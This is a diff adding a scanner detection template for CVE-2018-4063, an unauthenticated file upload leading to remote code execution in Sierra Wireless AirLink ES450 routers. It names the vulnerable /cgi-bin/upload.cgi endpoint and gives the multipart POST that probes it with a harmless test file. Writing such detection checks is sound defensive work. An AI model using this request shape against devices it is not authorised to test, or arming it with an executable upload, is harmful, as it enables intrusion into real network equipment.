@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "检测 Sierra Wireless AirLink ES450 设备的 /cgi-bin/upload.cgi 文件上传接口。该接口存在未授权文件上传漏洞，攻击者可通过发送特制 HTTP 请求上传可执行文件，由于上传路径位于 Web 服务器可路由目录中，上传的可执行文件可被远程调用执行，最终导致远程代码执行。该漏洞影响 Sierra Wireless AirLink ES450 FW 4.9.3 及以下版本，CVSS v3.1 评分为 8.8，危害等级高。"
+id = "POC-AVE-2018-0708"
+name = "Sierra Wireless AirLink ES450 upload.cgi 远程代码执行漏洞检测"
+severity = "high"
+tags = ["ave-2018-0708"]
+vuln_id = [
+    "CVE-2018-4063",
+    "AVE-2018-0708",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/upload.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+----AveBoundary\r
+Content-Disposition: form-data; name="file"; filename="test.txt"\r
+Content-Type: application/octet-stream\r
+\r
+AVE_TEST\r
+----AveBoundary--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----AveBoundary"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
